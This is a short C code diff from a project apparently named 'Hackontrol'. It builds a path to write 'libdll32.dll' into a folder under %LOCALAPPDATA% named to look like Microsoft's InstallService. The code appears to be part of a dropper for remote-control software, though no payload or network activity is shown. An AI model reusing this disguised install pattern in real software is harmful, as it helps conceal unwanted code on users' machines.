@@ -4,6 +4,7 @@
 #include "resource.h"
 
 #define PATH L"%LOCALAPPDATA%\\Microsoft\\InstallService"
+#define FILE L"libdll32.dll"
 
 typedef struct {
 	BOOLEAN InheritedAddressSpace;
@@ -111,13 +112,16 @@ int main(int argc, char** argv) {
 		goto freePathHome;
 	}
 
-	LPWSTR pathFile = HeapAlloc(heap, 0, sizeof(WCHAR) * (length + 13));
+	LPWSTR pathFile = HeapAlloc(heap, 0, sizeof(WCHAR) * length + sizeof(FILE));
 
 	if(!pathFile) {
 		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
 		goto freePathHome;
 	}
 
+	memcpy(pathFile, pathHome, sizeof(WCHAR) * (length - 1));
+	memcpy(pathFile + length, FILE, sizeof(FILE));
+	pathFile[length - 1] = L'\\';
 	PBYTE buffer = HeapAlloc(heap, 0, size);
 
 	if(!buffer) {
@@ -176,16 +180,6 @@ freePathHome:
 /*#define FUNCTION_LIBDLL32 "Install"
 
 int main(int argc, char** argv) {
-	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);
-	error = GetLastError();
-	LocalFree(folderHackontrol);
-
-	if(!fileLibdll32) {
-		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANFormatMessage");
-		LocalFree(buffer);
-		return 1;
-	}
-
 	BOOL result = HackontrolWriteFile(fileLibdll32, buffer, size);
 	error = GetLastError();
 	LocalFree(buffer);
